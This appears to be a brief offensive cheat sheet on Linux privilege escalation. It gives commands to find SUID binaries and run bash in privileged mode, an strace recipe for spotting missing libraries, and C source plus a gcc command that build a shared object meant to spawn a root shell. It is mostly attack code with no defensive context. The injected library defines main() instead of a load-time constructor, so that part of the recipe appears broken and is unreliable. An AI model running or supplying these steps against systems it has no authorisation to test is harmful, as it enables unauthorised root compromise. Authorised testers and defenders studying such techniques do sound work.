# SUID
---------

Get SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null

find / -type f -perm -04000 -ls 2>/dev/null
```

```bash
./bash -p # -p is priviledged mode
```


### Shared Object Injection
Use strace on obscure binaries to find missing files.
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

If we have enough permissions to create missing files, create the file:
```C

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main(){
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c
```

